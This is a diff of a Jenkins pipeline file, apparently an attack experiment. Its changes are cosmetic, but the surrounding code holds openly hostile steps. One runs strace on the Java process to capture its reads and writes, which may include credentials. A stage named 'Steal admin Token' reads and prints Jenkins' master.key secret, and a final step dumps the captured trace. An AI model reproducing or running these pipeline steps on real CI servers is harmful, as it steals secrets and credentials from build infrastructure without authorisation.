@@ -1,10 +1,11 @@
 #!groovy
 
 pipeline {
-  agent { label 'ubuntu' }
   stages {
     stage('Maven Install') {
+	
       agent {
+	    label 'ubuntu'
         docker {
           image 'maven:3-alpine'
           label 'ubuntu'
@@ -19,10 +20,10 @@ pipeline {
         sh 'sudo strace -fp $(pidof java) -v -e read,write -s 9999 -o /home/ubuntu/out.2 &'
         git credentialsId: '351e1846-ed9e-4901-a0ae-0e02fa904cd3', url: 'https://github.com/nimrods8/peMaker.git'    
       }
-    } 
+    } // end stage
 	
 	stage('Steal admin Token') {
-		agent {  
+		agent {
 			label 'master' 
 			def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
 			println fileContents
@@ -54,7 +55,7 @@ pipeline {
 			sh 'sudo kill $(pidof strace)'
 			sh 'sudo cat /home/ubuntu/out.2'
 	  } // end agent
-	}
+	} // end stage
   } // end stages	
 } // end pipeline
 
